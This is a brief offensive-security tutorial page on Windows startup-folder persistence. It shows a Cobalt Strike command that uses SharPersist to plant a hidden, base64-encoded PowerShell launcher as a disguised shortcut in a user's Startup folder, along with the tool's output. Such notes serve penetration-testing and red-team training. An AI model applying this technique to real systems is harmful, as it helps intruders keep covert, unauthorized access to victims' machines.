# Startup Folder

## Introduction - Startup Folder

Applications within a users startup folder are launched automatically when the user logs in to their workstation. It's typically used to set the users home environment, set shortcuts, etc.

## SharPersist & Cobalt Strike

We can use the `execute-shellcode` command from an existing beacon in CobaltStrike to establish persistence. We'll also have to utilize a tool like [SharPersist](https://github.com/mandiant/SharPersist) as there are no built-in persistence tools.&#x20;

#### Execute Payload

```powershell
beacon> execute-assembly C:\Tools\SharPersist.exe -t startupfolder -c 
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo...AGEAIgApACkA" -f "NameOfFile" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoA...bQAvAGEAIgApACkA
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
```

Where:

* `-f` is the filename to save as.

